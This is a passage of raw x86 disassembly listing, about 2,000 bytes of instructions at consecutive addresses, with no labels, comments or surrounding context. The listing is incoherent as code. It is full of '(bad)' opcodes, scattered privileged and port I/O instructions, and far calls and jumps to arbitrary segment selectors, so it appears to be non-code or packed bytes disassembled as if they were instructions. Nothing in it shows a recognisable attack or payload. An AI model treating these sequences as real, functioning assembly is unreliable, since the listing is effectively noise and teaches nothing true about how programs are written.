  410dc4:	loopne 0x410de9
  410dc6:	sbb    DWORD PTR [edx+0x2b],esi
  410dc9:	fwait
  410dca:	popf   
  410dcb:	mov    esi,0xc39bc1f3
  410dd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dd1:	mov    ebx,0x8a01650d
  410dd6:	stc    
  410dd7:	into   
  410dd8:	stc    
  410dd9:	mov    ecx,0x2956d2af
  410dde:	inc    ebp
  410ddf:	push   ebx
  410de0:	cdq    
  410de1:	popa   
  410de2:	paddq  mm2,QWORD PTR [ebp-0x69]
  410de6:	or     BYTE PTR [ecx-0x61],cl
  410de9:	shl    BYTE PTR [esi+0x5620718f],1
  410def:	call   0xd17a:0x2c20fda4
  410df6:	jge    0x410d9c
  410df8:	daa    
  410df9:	xchg   ebx,eax
  410dfa:	xchg   esi,eax
  410dfb:	xchg   ecx,eax
  410dfc:	mov    al,0xfa
  410dfe:	push   ecx
  410dff:	jmp    0x410e76
  410e01:	xlat   BYTE PTR ds:[ebx]
  410e02:	fdiv   DWORD PTR [esi+eiz*2]
  410e05:	call   0xd70a:0xbe9fe314
  410e0c:	sbb    DWORD PTR [ecx-0x3a242cfc],ebp
  410e12:	outs   dx,BYTE PTR ds:[esi]
  410e13:	daa    
  410e14:	dec    ebx
  410e15:	cmp    eax,0x3fbc05fc
  410e1a:	mov    dl,0xfd
  410e1c:	pop    ebx
  410e1d:	jp     0x410e18
  410e1f:	cmp    esi,edx
  410e21:	and    DWORD PTR [edx+0x48],edi
  410e24:	fs jg  0x410df0
  410e27:	xchg   DWORD PTR [ebp-0x7277e4e1],edx
  410e2d:	fs adc ebp,ecx
  410e30:	scas   eax,DWORD PTR es:[edi]
  410e31:	out    0xc7,al
  410e33:	pop    esp
  410e34:	test   eax,0x4b959d6c
  410e39:	cmp    al,0xdb
  410e3b:	les    ecx,FWORD PTR [edi]
  410e3d:	aaa    
  410e3e:	out    dx,al
  410e3f:	shl    BYTE PTR [ebx+ecx*1],1
  410e42:	adc    DWORD PTR [edi],0xffffffad
  410e45:	mov    edx,0xe1c0ca4a
  410e4a:	push   edx
  410e4b:	adc    al,0x4
  410e4d:	and    eax,0xa0d1bf25
  410e52:	cld    
  410e53:	sar    BYTE PTR [edx],1
  410e55:	xor    edx,DWORD PTR ds:0x5f931c0b
  410e5b:	fwait
  410e5c:	mov    bl,0x3e
  410e5e:	(bad)  
  410e5f:	in     eax,0x95
  410e61:	ins    DWORD PTR es:[edi],dx
  410e62:	push   ss
  410e63:	sub    DWORD PTR [eax],edi
  410e65:	std    
  410e66:	inc    ecx
  410e67:	cmp    eax,0xf403bd76
  410e6c:	inc    ebp
  410e6d:	xchg   esp,eax
  410e6e:	mov    edi,0xe81d2586
  410e73:	out    0x60,eax
  410e75:	jmp    0x410eb7
  410e77:	push   esi
  410e78:	lock lahf 
  410e7a:	iret   
  410e7b:	jmp    0x410ea1
  410e7d:	outs   dx,DWORD PTR ds:[esi]
  410e7e:	xchg   BYTE PTR [ebp+0x421f9e0a],al
  410e84:	adc    al,0x86
  410e86:	repnz pop edx
  410e88:	or     al,al
  410e8a:	in     eax,dx
  410e8b:	dec    eax
  410e8c:	or     ah,BYTE PTR [esi-0x78]
  410e8f:	xor    al,0xe
  410e91:	(bad)  
  410e92:	jmp    0x2bb:0xfc113366
  410e99:	dec    DWORD PTR gs:[edx-0x4a]
  410e9d:	imul   ebp,DWORD PTR [eax+0x2200136c],0xffffffd8
  410ea4:	xor    BYTE PTR [ebx-0x62],al
  410ea7:	inc    ecx
  410ea8:	mov    bl,0x81
  410eaa:	or     esp,0xfb647ae0
  410eb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410eb1:	sahf   
  410eb2:	adc    ch,0xfa
  410eb5:	and    esp,DWORD PTR [esp+esi*4]
  410eb8:	cmp    al,0x3e
  410eba:	add    DWORD PTR [ecx-0x2],ebx
  410ebd:	test   eax,0x396f52ae
  410ec2:	sub    al,0x6f
  410ec4:	loope  0x410f10
  410ec6:	aam    0x8a
  410ec8:	stos   BYTE PTR es:[edi],al
  410ec9:	jns    0x410f44
  410ecb:	cmc    
  410ecc:	mov    ebx,0x492ad1d0
  410ed1:	fs jb  0x410e64
  410ed4:	mov    edi,DWORD PTR [ebx+0x6e45c53b]
  410eda:	or     al,0x63
  410edc:	rcr    BYTE PTR ds:0x6d5dc61f,cl
  410ee2:	rep lods al,BYTE PTR ds:[esi]
  410ee4:	mov    gs,WORD PTR [esi-0x5be720bd]
  410eea:	jne    0x410ecb
  410eec:	push   0xcdc79b9a
  410ef1:	inc    ebx
  410ef2:	and    DWORD PTR [ecx],edi
  410ef4:	imul   esp,eax,0xffffff84
  410ef7:	aas    
  410ef8:	adc    bh,0xe0
  410efb:	outs   dx,DWORD PTR ds:[esi]
  410efc:	fs xchg esp,eax
  410efe:	dec    esi
  410eff:	(bad)  
  410f00:	mov    cl,0xaa
  410f03:	sbb    al,0xba
  410f05:	jg     0x410efd
  410f07:	fiadd  WORD PTR [ebp+0x6578caaa]
  410f0d:	popa   
  410f0e:	and    edi,ecx
  410f10:	sbb    eax,0x514c0c40
  410f15:	out    0xd2,ax
  410f18:	mov    dl,0xb
  410f1a:	pop    eax
  410f1b:	test   DWORD PTR [eax-0x46b99726],ebx
  410f21:	mov    ah,0xa6
  410f23:	add    DWORD PTR [edx],ebx
  410f25:	les    edi,FWORD PTR [ebx+0x4a]
  410f28:	mov    dh,0x7d
  410f2a:	mov    esp,0x231e2ea9
  410f2f:	sbb    DWORD PTR [eax-0x27],ebx
  410f32:	fsub   DWORD PTR [esi-0x1c]
  410f35:	outs   dx,BYTE PTR ds:[esi]
  410f36:	rcr    edi,1
  410f38:	(bad)  
  410f39:	jmp    0xc920:0x875a4e95
  410f40:	pusha  
  410f41:	test   dl,al
  410f43:	mov    dh,BYTE PTR [edx]
  410f45:	retf   0x873b
  410f48:	inc    edx
  410f49:	mov    eax,ds:0xcee74e89
  410f4e:	lods   eax,DWORD PTR ds:[esi]
  410f4f:	das    
  410f50:	jno    0x410ee0
  410f52:	jnp    0x410f0a
  410f54:	mov    dl,BYTE PTR [ecx]
  410f56:	test   DWORD PTR [ebp+0x38768664],eax
  410f5c:	dec    eax
  410f5d:	fst    DWORD PTR [ebp+0x4885579a]
  410f63:	mov    cl,0x0
  410f65:	sbb    eax,0xc74e43ef
  410f6a:	adc    edx,DWORD PTR [ecx+eax*8]
  410f6d:	cdq    
  410f6e:	inc    eax
  410f6f:	js     0x410f9a
  410f71:	lock repnz push ebx
  410f74:	cli    
  410f75:	(bad)  
  410f77:	ret    0xef7
  410f7a:	inc    ebp
  410f7b:	jo     0x410f8b
  410f7d:	sbb    bh,BYTE PTR [edi-0x667234cf]
  410f83:	fisubr WORD PTR [eax-0x7c5e8a24]
  410f89:	iret   
  410f8a:	pop    ebp
  410f8b:	(bad)  
  410f8c:	in     eax,0xa7
  410f8e:	xor    DWORD PTR [edi],ebp
  410f90:	clc    
  410f91:	adc    al,0x5a
  410f93:	fdivrp st(6),st
  410f95:	ins    BYTE PTR es:[edi],dx
  410f96:	or     BYTE PTR [edx],bh
  410f98:	ja     0x410f57
  410f9a:	xchg   ecx,eax
  410f9b:	ret    
  410f9c:	hlt    
  410f9d:	cmp    ecx,edx
  410f9f:	sbb    edx,DWORD PTR [eax+0x62d2509]
  410fa5:	push   es
  410fa6:	ret    0xb35c
  410fa9:	inc    edi
  410faa:	call   0xec20:0x930daa27
  410fb1:	(bad)  
  410fb2:	sbb    cl,BYTE PTR [ecx]
  410fb4:	dec    eax
  410fb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fb6:	xlat   BYTE PTR ds:[ebx]
  410fb7:	cs dec esi
  410fb9:	jge    0x410ff7
  410fbb:	dec    eax
  410fbc:	fdivr  QWORD PTR [ecx+0x25eca296]
  410fc2:	mov    ebx,0x261613cf
  410fc7:	push   esp
  410fc8:	pop    esp
  410fc9:	das    
  410fca:	scas   eax,DWORD PTR es:[edi]
  410fcb:	sbb    eax,0xbe78cb14
  410fd0:	mov    edx,0xdb80e046
  410fd5:	sub    dh,bh
  410fd7:	inc    esi
  410fd8:	add    eax,edx
  410fda:	enter  0x86e1,0x72
  410fde:	lea    edi,[edi-0xb49866b]
  410fe4:	pushf  
  410fe5:	pop    edi
  410fe6:	in     al,dx
  410fe7:	pop    ebp
  410fe8:	call   0x4cbd36
  410fed:	sub    BYTE PTR [edx-0x12],bh
  410ff0:	dec    esi
  410ff1:	scas   al,BYTE PTR es:[edi]
  410ff2:	jge    0x410f7c
  410ff4:	adc    BYTE PTR [ecx-0x47],bl
  410ff7:	xlat   BYTE PTR ds:[ebx]
  410ff8:	push   eax
  410ff9:	cmp    DWORD PTR ds:0x295193c7,ebp
  410fff:	sbb    DWORD PTR [esi+0x1aea49ef],esp
  411005:	mov    ecx,esp
  411007:	push   ss
  411008:	popf   
  411009:	fcomp  DWORD PTR [esi+0x25]
  41100c:	stos   BYTE PTR es:[edi],al
  41100d:	enter  0xf5be,0xe5
  411011:	or     BYTE PTR [edi+0x51daa219],dl
  411017:	stos   BYTE PTR es:[edi],al
  411018:	or     al,0x6f
  41101a:	pushf  
  41101b:	sub    eax,edx
  41101d:	inc    eax
  41101e:	mov    BYTE PTR [ebx],dh
  411020:	mov    ebp,0x84c08509
  411025:	(bad)  
  411026:	retf   0x8d2d
  411029:	jbe    0x411076
  41102b:	into   
  41102c:	push   ecx
  41102d:	pop    ds
  41102e:	(bad)  
  41102f:	das    
  411030:	and    eax,edi
  411032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411033:	stc    
  411034:	push   es
  411035:	into   
  411036:	les    esp,FWORD PTR [edi+eax*8+0x5d24513c]
  41103d:	add    edx,esp
  41103f:	and    BYTE PTR [edi+0x33],0xfc
  411043:	enter  0x3043,0x4c
  411047:	cli    
  411048:	jle    0x411062
  41104a:	add    dh,bl
  41104c:	or     DWORD PTR [ebx-0x300fd26c],edx
  411052:	sub    BYTE PTR [eax-0xd192dea],bh
  411058:	sbb    DWORD PTR [ebp+0x1eebc192],ebx
  41105e:	fprem1 
  411060:	mov    esi,0xb7d7fe4a
  411065:	dec    DWORD PTR [ebp+0x22]
  411068:	loopne 0x41107f
  41106a:	aas    
  41106b:	ret    
  41106c:	test   DWORD PTR [eax],0x7043d024
  411072:	pop    edi
  411073:	retf   0xe42e
  411076:	call   0xc583:0xdda89223
  41107d:	adc    eax,0xa05d7621
  411082:	mov    eax,0x9bfa17f3
  411087:	popa   
  411088:	ins    DWORD PTR es:[edi],dx
  411089:	(bad)  
  41108a:	dec    BYTE PTR [edx]
  41108c:	adc    BYTE PTR [edi+0x17],al
  41108f:	mov    WORD PTR [ebx+0x44],fs
  411092:	idiv   BYTE PTR [ebx-0x24]
  411095:	sub    ah,0x24
  411098:	cmp    BYTE PTR [ecx-0x5f],0x82
  41109c:	mov    ah,BYTE PTR [edi+0x37]
  41109f:	inc    al
  4110a1:	xlat   BYTE PTR ds:[ebx]
  4110a2:	push   ebx
  4110a3:	imul   esi,DWORD PTR [edi],0xffffff92
  4110a6:	jbe    0x4110c0
  4110a8:	mov    edi,0xedf632a
  4110ad:	pusha  
  4110ae:	inc    edi
  4110af:	rol    DWORD PTR [edx+0x7bc27502],1
  4110b5:	sub    edx,DWORD PTR [ecx]
  4110b7:	jno    0x41109b
  4110b9:	fimul  DWORD PTR [ebx+0x4644d3db]
  4110bf:	in     eax,0x4f
  4110c1:	xor    edx,DWORD PTR [ecx+0x798f9df4]
  4110c7:	sub    cl,bl
  4110c9:	in     eax,0xa6
  4110cb:	mov    ch,0x57
  4110cd:	mov    BYTE PTR [ebx+edx*2],ch
  4110d0:	test   bl,al
  4110d2:	push   eax
  4110d3:	mov    ebx,0x8da1cec6
  4110d8:	cmp    esp,0x38
  4110db:	xor    BYTE PTR [edi-0xacd6907],al
  4110e1:	xor    eax,DWORD PTR [esi-0x1aa96b7e]
  4110e7:	popa   
  4110e8:	lock mov esi,0x3203a153
  4110ee:	push   0x9a353e3d
  4110f3:	mov    edx,0xf377f250
  4110f8:	mov    ebp,0x4bf1b7e1
  4110fd:	rcl    BYTE PTR [eax-0x5b842164],0x87
  411104:	pop    eax
  411105:	or     DWORD PTR [ebx-0x12bef925],esi
  41110b:	inc    esi
  41110c:	add    BYTE PTR [ecx-0xbd55d17],al
  411112:	clc    
  411113:	dec    eax
  411114:	in     al,0x13
  411116:	sub    ebp,DWORD PTR [ecx+0x6ce99669]
  41111c:	das    
  41111d:	xor    eax,DWORD PTR [ecx+0x38ec7c08]
  411123:	ins    DWORD PTR es:[edi],dx
  411124:	sbb    BYTE PTR [edi-0x390abd06],dl
  41112a:	rcr    BYTE PTR [esi-0x90de13],0xcf
  411131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411132:	ja     0x41113f
  411134:	and    eax,0xa79b6392
  411139:	les    eax,FWORD PTR [ebx+0xe3f74b5]
  41113f:	mov    esp,0x9d39458c
  411144:	jmp    0xca6:0x721bab52
  41114b:	lea    ecx,[esi+0x1b50a6e0]
  411151:	and    bl,BYTE PTR [esi-0x74]
  411154:	mov    dl,0x37
  411156:	aad    0xdb
  411158:	xor    eax,0x87d3f2d9
  41115d:	stos   BYTE PTR es:[edi],al
  41115e:	add    esi,ecx
  411160:	push   ecx
  411161:	jecxz  0x41116f
  411163:	pop    esp
  411164:	push   esp
  411165:	call   0xb3ee388a
  41116a:	dec    ebx
  41116b:	sub    BYTE PTR [ebx],ch
  41116d:	cs pushf 
  41116f:	dec    esi
  411170:	mov    ecx,0x9854bc00
  411175:	scas   al,BYTE PTR es:[edi]
  411176:	daa    
  411177:	fld    QWORD PTR [esi]
  411179:	xchg   esi,eax
  41117a:	test   DWORD PTR [eax],ecx
  41117c:	out    dx,eax
  41117d:	iret   
  41117e:	call   0x71fd:0x3d6b4730
  411185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411186:	pop    ss
  411187:	ror    BYTE PTR [edi+0x6e56bf5c],1
  41118d:	cdq    
  41118e:	in     eax,0xea
  411190:	dec    ecx
  411191:	outs   dx,BYTE PTR ds:[esi]
  411192:	loopne 0x411190
  411194:	jmp    0xce0f9cbe
  411199:	mov    ecx,edx
  41119b:	je     0x41120c
  41119d:	inc    edx
  41119e:	jnp    0x41112f
  4111a0:	inc    dl
  4111a2:	ret    
  4111a3:	ret    0xb15b
  4111a6:	pop    ecx
  4111a7:	fild   QWORD PTR [edx]
  4111a9:	rol    DWORD PTR [ecx+ebx*8-0x24],cl
  4111ad:	fst    QWORD PTR ss:[eax+esi*2+0x23]
  4111b2:	mov    dh,0x97
  4111b4:	in     al,dx
  4111b5:	aad    0x7a
  4111b7:	ret    
  4111b8:	(bad)  
  4111b9:	div    BYTE PTR [edi-0x2b9b37ae]
  4111bf:	sub    ch,0x26
  4111c2:	cld    
  4111c3:	pop    edi
  4111c4:	lods   al,BYTE PTR ds:[esi]
  4111c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111c6:	jmp    0x431f77c2
  4111cb:	loopne 0x41124a
  4111cd:	out    dx,eax
  4111ce:	and    BYTE PTR ds:0x2a0c1c44,dh
  4111d4:	lods   al,BYTE PTR ds:[esi]
  4111d5:	aas    
  4111d6:	test   BYTE PTR [ecx+0xd],bh
  4111d9:	mov    esp,0xe69f4881
  4111de:	dec    ebx
  4111df:	jne    0x4111f5
  4111e1:	(bad)  
  4111e2:	mov    ?,WORD PTR [ecx-0x66]
  4111e5:	js     0x41118b
  4111e7:	jle    0x41121d
  4111e9:	xor    dh,BYTE PTR [ecx+0x39a2e5ba]
  4111ef:	sub    al,0x6f
  4111f1:	fwait
  4111f2:	sti    
  4111f3:	xor    BYTE PTR [esi-0x6d69f043],al
  4111f9:	sbb    bh,dl
  4111fb:	mov    bh,0xec
  4111fd:	mov    ds:0x3dba4047,eax
  411202:	add    dl,BYTE PTR [edx+0x16ce6a54]
  411208:	imul   edx,ecx,0x783b90e6
  41120e:	cmp    DWORD PTR [ebx-0x3e],ebp
  411211:	dec    esp
  411212:	xchg   ebp,eax
  411213:	sub    DWORD PTR [eax],ebp
  411215:	fdiv   st(1),st
  411217:	inc    edi
  411218:	rcr    DWORD PTR [ecx],1
  41121a:	jae    0x4111a3
  41121c:	lods   al,BYTE PTR ds:[esi]
  41121d:	inc    ebp
  41121e:	out    0x3f,al
  411220:	dec    ebx
  411221:	cs jno 0x411299
  411224:	push   0xa7a6e813
  411229:	(bad)  
  41122a:	icebp  
  41122b:	mov    ecx,0x9e4bc3b5
  411230:	jne    0x411226
  411232:	outs   dx,DWORD PTR ds:[esi]
  411233:	adc    al,0x4d
  411235:	jae    0x4112a9
  411237:	xlat   BYTE PTR ds:[ebx]
  411238:	mov    ch,ah
  41123a:	rcr    DWORD PTR [ecx+ebx*1+0x33],cl
  41123e:	outs   dx,DWORD PTR ds:[esi]
  41123f:	inc    edx
  411240:	dec    ebx
  411241:	adc    DWORD PTR [ebx],0x19
  411244:	mov    esp,0xd4634782
  411249:	sub    al,0xdb
  41124b:	dec    ebx
  41124c:	mov    edi,0x2563fd86
  411251:	cmp    al,0x2f
  411253:	push   es
  411254:	gs scas eax,DWORD PTR es:[edi]
  411256:	pop    edx
  411257:	mov    al,0x5
  411259:	outs   dx,DWORD PTR ds:[esi]
  41125a:	sar    BYTE PTR [ecx-0x7d],cl
  41125d:	pop    edx
  41125f:	jecxz  0x411253
  411261:	jb     0x4112cc
  411263:	cmp    ebp,DWORD PTR ss:[esp+ecx*1-0x79]
  411268:	or     BYTE PTR [eax-0x6ce98fb3],0x35
  41126f:	(bad)  
  411270:	push   esi
  411271:	sub    ebp,DWORD PTR [esi]
  411273:	pop    es
  411274:	mov    bl,0xa1
  411276:	mov    ebx,eax
  411278:	mov    eax,0x11937024
  41127d:	jg     0x4112d1
  41127f:	shl    DWORD PTR [edi+0x31],1
  411282:	pop    esp
  411283:	call   0x1ea9:0xa19aa878
  41128a:	or     ah,BYTE PTR [eax-0x41b66a4e]
  411290:	cmp    eax,edx
  411292:	cmp    bh,BYTE PTR [eax]
  411294:	jnp    0x4112b9
  411296:	mov    al,BYTE PTR [eax+0x4]
  411299:	cmp    BYTE PTR [edx-0x36296557],dh
  41129f:	push   eax
  4112a0:	mov    ds:0x11843ba6,al
  4112a5:	and    DWORD PTR [edi+0x2a],eax
  4112a8:	in     al,0x8f
  4112aa:	lock test DWORD PTR [ebx],edi
  4112ad:	push   esp
  4112ae:	and    dl,al
  4112b0:	test   eax,eax
  4112b2:	ds pop ebx
  4112b4:	arpl   WORD PTR [ebp-0x77],bx
  4112b7:	pop    ss
  4112b8:	fsubr  st,st(1)
  4112ba:	int    0xa4
  4112bc:	or     eax,0x2adba527
  4112c1:	sub    bl,BYTE PTR [edx+0x40]
  4112c4:	push   esi
  4112c5:	jmp    0xa19:0x8d94644d
  4112cc:	or     ebx,esi
  4112ce:	lea    edx,[ebp-0x7e9ede44]
  4112d4:	pop    edi
  4112d5:	xchg   DWORD PTR [eax],edx
  4112d7:	mov    ecx,0x563ed44d
  4112dc:	and    BYTE PTR [edx],ah
  4112de:	arpl   WORD PTR [esi],dx
  4112e0:	pop    ebx
  4112e1:	daa    
  4112e2:	ret    0xe941
  4112e5:	cwde   
  4112e6:	loop   0x41129a
  4112e8:	pushf  
  4112e9:	rcl    DWORD PTR cs:[edi+eiz*2+0x9],0xe7
  4112ef:	and    edi,edx
  4112f1:	xchg   edi,eax
  4112f2:	fstp   TBYTE PTR [eax+eiz*4-0x3b5ba442]
  4112f9:	or     cl,dh
  4112fb:	sub    DWORD PTR [ecx+0x5048e89a],0x5a
  411302:	lock cld 
  411304:	xor    al,0x37
  411306:	pop    ss
  411307:	jb     0x411334
  411309:	push   ebp
  41130a:	clc    
  41130b:	add    ah,BYTE PTR [esi]
  41130d:	sbb    edi,DWORD PTR [ecx]
  41130f:	mov    eax,ds:0x44dae6dc
  411314:	lea    ebp,[edx-0x5e5d35fd]
  41131a:	popa   
  41131b:	sub    eax,0xf8f20a1d
  411320:	fdivr  DWORD PTR [esi]
  411322:	push   edi
  411323:	test   bh,bl
  411325:	ret    
  411326:	int3   
  411327:	call   0x73261509
  41132c:	mov    ebp,0xf580c5f1
  411331:	loope  0x41138b
  411333:	and    al,0xbc
  411335:	ret    
  411336:	int3   
  411337:	sub    eax,0xe453a334
  41133c:	pop    edx
  41133d:	push   0x5737f46c
  411342:	rol    DWORD PTR [ebx-0x1d],0xbe
  411346:	fild   QWORD PTR [edi-0x37b358ec]
  41134c:	out    dx,eax
  41134d:	mov    dh,dl
  41134f:	int3   
  411350:	imul   edx,DWORD PTR [edx-0x6c01bcb3],0xa84004bd
  41135a:	std    
  41135b:	mov    DWORD PTR [esi-0x71],ebp
  41135e:	mov    bl,0x6a
  411360:	rol    BYTE PTR [edx+edi*8],1
  411363:	mov    edi,0xaeb6f62e
  411368:	dec    ebx
  411369:	mov    ebp,esp
  41136b:	test   al,0x73
  41136d:	stos   DWORD PTR es:[edi],eax
  41136e:	mov    ds:0xdb084fe3,eax
  411373:	or     bl,BYTE PTR [edi+0x74]
  411376:	mov    al,0x2c
  411379:	sbb    BYTE PTR [ebx],bl
  41137b:	mov    ds:0xe3b147a1,eax
  411380:	xchg   ecx,eax
  411381:	lds    ecx,FWORD PTR [eax+0x1b8ca553]
  411387:	call   0x6eea28d5
  41138c:	inc    esi
  41138d:	fisubr DWORD PTR [ebp+0xa]
  411390:	xchg   esi,eax
  411391:	dec    esi
  411392:	aaa    
  411393:	mov    ebx,0xaacaa6c8
  411398:	gs pop ss
  41139a:	bound  ebx,QWORD PTR ds:0x5990094d
  4113a0:	pop    ss
  4113a1:	push   ecx
  4113a2:	ret    0x8521
  4113a5:	inc    edi
  4113a6:	mov    ds:0x1eae67a7,eax
  4113ab:	stos   DWORD PTR es:[edi],eax
  4113ac:	push   esp
  4113ad:	push   edi
  4113ae:	pop    ebp
  4113af:	dec    eax
  4113b0:	mov    ebx,0xcc19a411
  4113b5:	sub    DWORD PTR [eax],ebp
  4113b7:	pop    edx
  4113b8:	mov    ds:0x931f8ba9,eax
  4113bd:	dec    esi
  4113be:	pop    ds
  4113bf:	into   
  4113c0:	mov    ebp,0x19a4e284
  4113c5:	icebp  
  4113c6:	mov    eax,ds:0x52db9532
  4113cb:	lds    esi,FWORD PTR [edi+0x3a81f869]
  4113d1:	or     edx,DWORD PTR [ebp+0x2d1e00cb]
  4113d7:	xor    ebx,DWORD PTR [ebx+0x36a05a8a]
  4113dd:	inc    esp
  4113de:	xor    DWORD PTR ds:0x7136948e,esi
  4113e4:	nop
  4113e5:	and    eax,0x67555975
  4113ea:	mov    ecx,0x482216b2
  4113ef:	(bad)  
  4113f0:	loopne 0x4113bf
  4113f2:	inc    ecx
  4113f3:	push   edi
  4113f4:	aaa    
  4113f5:	shl    bl,1
  4113f7:	mov    al,ds:0x80ede33c
  4113fc:	(bad)  
  4113fd:	scas   eax,DWORD PTR es:[edi]
  4113fe:	add    bh,ch
  411400:	fsub   QWORD PTR [edx-0x40]
  411403:	fadd   DWORD PTR [eax+edx*4-0x13]
  411407:	out    0xb3,eax
  411409:	not    DWORD PTR [ebx]
  41140b:	mov    al,0xbd
  41140d:	xor    al,0xfc
  41140f:	out    0x7a,al
  411411:	or     eax,0xed04ff6a
  411416:	inc    edx
  411417:	js     0x411470
  411419:	loope  0x41139f
  41141b:	add    al,0xce
  41141d:	mov    dl,0x37
  41141f:	jmp    FWORD PTR [ebp+0x23]
  411422:	or     eax,eax
  411424:	xor    esi,DWORD PTR [esi]
  411426:	jo     0x411444
  411428:	inc    ecx
  411429:	gs inc edx
  41142b:	in     eax,0x86
  41142d:	dec    ebp
  41142e:	sbb    DWORD PTR [eax+eax*2-0x21],edi
  411432:	sub    al,0x1c
  411434:	xlat   BYTE PTR ds:[ebx]
  411435:	ja     0x4113cb
  411437:	dec    edi
  411438:	rcr    DWORD PTR [edx],cl
  41143a:	cmp    dh,al
  41143c:	sbb    DWORD PTR [ecx-0x73072259],esi
  411442:	stc    
  411443:	gs stos BYTE PTR es:[edi],al
  411445:	ror    BYTE PTR [ecx+0x11ad239c],1
  41144b:	outs   dx,BYTE PTR ds:[esi]
  41144c:	outs   dx,DWORD PTR ds:[esi]
  41144d:	sbb    BYTE PTR [ecx],0x5b
  411450:	adc    BYTE PTR [edx+0x7f],0xb0
  411454:	adc    esi,edx
  411456:	pop    ecx
  411457:	mov    eax,0xdab45bbe
  41145c:	imul   ebp,DWORD PTR [esi],0x3b
  41145f:	js     0x411428
  411461:	pop    ecx
  411462:	into   
  411463:	(bad)  [eax+ebp*1-0x39]
  411467:	cmp    ecx,DWORD PTR [edx+0x6f]
  41146a:	out    0x79,eax
  41146c:	jge    0x41148b
  41146e:	inc    ebp
  41146f:	outs   dx,DWORD PTR ds:[esi]
  411470:	fstp   st(1)
  411472:	xchg   BYTE PTR [edi],dh
  411474:	or     edi,edi
  411476:	ins    DWORD PTR es:[edi],dx
  411477:	and    BYTE PTR [edx+0x40aa077c],bh
  41147d:	jne    0x411450
  41147f:	pop    edi
  411480:	scas   eax,DWORD PTR es:[edi]
  411481:	add    dl,BYTE PTR [ebp+0x7e64d083]
  411487:	xchg   DWORD PTR [edx],eax
  411489:	aam    0xc8
  41148b:	stos   BYTE PTR es:[edi],al
  41148c:	ins    DWORD PTR es:[edi],dx
  41148d:	ins    DWORD PTR es:[edi],dx
  41148e:	fiadd  WORD PTR ds:[ebx+0x13]
  411492:	jg     0x411461
  411494:	retf   0x5709
  411497:	sbb    al,BYTE PTR [ecx]
  411499:	jmp    0x411422
  41149b:	mov    ebx,0x19f51bd9
  4114a0:	or     eax,0xda816966
  4114a5:	aaa    
  4114a6:	cmp    edi,DWORD PTR [ecx+0x7a]
  4114a9:	mov    eax,0x98fabff9
  4114ae:	sbb    al,0xb3
  4114b0:	adc    dl,ah
  4114b2:	mov    edi,0xab124225
  4114b7:	jl     0x411523
  4114b9:	inc    edi
  4114ba:	jl     0x411516
  4114bc:	push   cs
  4114bd:	jo     0x411458
  4114bf:	fst    DWORD PTR [esi-0x26d78d0f]
  4114c5:	lahf   
  4114c6:	test   al,0xf3
  4114c8:	test   BYTE PTR [edx+0x4c],0xd5
  4114cc:	cmc    
  4114cd:	mov    ebx,DWORD PTR [ebx-0x7da6ad9f]
  4114d3:	pop    esi
  4114d4:	adc    DWORD PTR [ecx-0x68172881],esp
  4114da:	popf   
  4114db:	cmp    al,0xc3
  4114dd:	xchg   ah,cl
  4114df:	pop    eax
  4114e0:	inc    ecx
  4114e1:	adc    eax,0x9a03381b
  4114e6:	mul    DWORD PTR [edx+0x38cb703c]
  4114ec:	and    BYTE PTR [ecx+0x22f2e603],dl
  4114f2:	jl     0x4114dc
  4114f4:	cwde   
  4114f5:	and    al,0x5c
  4114f7:	call   0x3d86fda
  4114fc:	sub    BYTE PTR [ebp+eax*4-0x79fd1101],bl
  411503:	div    DWORD PTR [eax-0x5ae043ac]
  411509:	loope  0x4114b3
  41150b:	stc    
  41150c:	pop    edi
  41150d:	cdq    
  41150e:	outs   dx,BYTE PTR ds:[si]
  411510:	sbb    DWORD PTR [eax],0xc9a9bb91
  411516:	ins    DWORD PTR es:[edi],dx
  411517:	mov    DWORD PTR [esi-0x58c5f094],ecx
  41151d:	pop    edi
  41151e:	aam    0x60
  411520:	dec    BYTE PTR [eax]
  411522:	xchg   esp,eax
  411523:	jnp    0x4114dc
  411525:	mov    ch,0xf3
  411527:	jnp    0x4114ba
  411529:	idiv   DWORD PTR [ebx]
  41152b:	mov    ds:0x59436975,al
  411530:	inc    ebp
  411531:	sar    DWORD PTR [edx+ebx*1],0xfe
  411535:	rcl    BYTE PTR [ebx-0xd],1
  411538:	bnd je 0x41152e
  41153b:	leave  
  41153c:	mov    bh,0xfb
  41153e:	pop    es
  41153f:	stos   BYTE PTR es:[edi],al
  411540:	sti    
  411541:	xor    ebp,0x5b8763ab
  411547:	or     DWORD PTR ds:0x46735f60,ecx
  41154d:	xor    BYTE PTR [ebx+0x4d],cl
  411550:	add    ebx,ebp
  411552:	xlat   BYTE PTR ds:[ebx]
  411553:	ja     0x41159c
  411555:	jecxz  0x41153c
  411557:	call   0x7e82ea9f
  41155c:	mov    ebp,0x3a577042
  411561:	cs jo  0x411514
  411564:	xor    ecx,ecx
  411566:	jmp    0x296fdfc6
  41156b:	test   eax,0xf5687875
  411570:	mov    al,0x1b
  411572:	jmp    0xa3a3d4ac
  411577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411578:	out    dx,al
  411579:	or     BYTE PTR [edx-0x5896b26],al
  41157f:	pop    ds
  411580:	repnz adc eax,0xb532501f
  411586:	fwait
  411587:	add    dl,ah
  411589:	dec    esp
  41158a:	dec    edx
  41158b:	mul    DWORD PTR [ebp-0x5f6d7804]
  411591:	pop    ds
  411592:	xor    dh,BYTE PTR [edi]
  411594:	mov    ebx,0xa3c93b76
  411599:	jno    0x4115b5
  41159b:	cmp    al,0xcb
  41159d:	int3   
  41159e:	aad    0x60
  4115a0:	lahf   
  4115a1:	call   0x3550:0xfc08c1d5
  4115a8:	xchg   esp,eax
  4115a9:	adc    esp,DWORD PTR [edi+0x7ae9d96f]
  4115af:	jns    0x41159d
  4115b1:	and    eax,0x7448a550
  4115b6:	xchg   esp,eax
  4115b7:	jbe    0x4115c8
  4115b9:	jnp    0x4115c5
  4115bb:	jge    0x411540
  4115bd:	stc    
  4115be:	dec    edx
  4115bf:	fwait
  4115c0:	xor    BYTE PTR [edx-0xfb0ee31],bl
  4115c6:	sub    ah,al
  4115c8:	push   ecx
  4115c9:	leave  
  4115ca:	cdq    
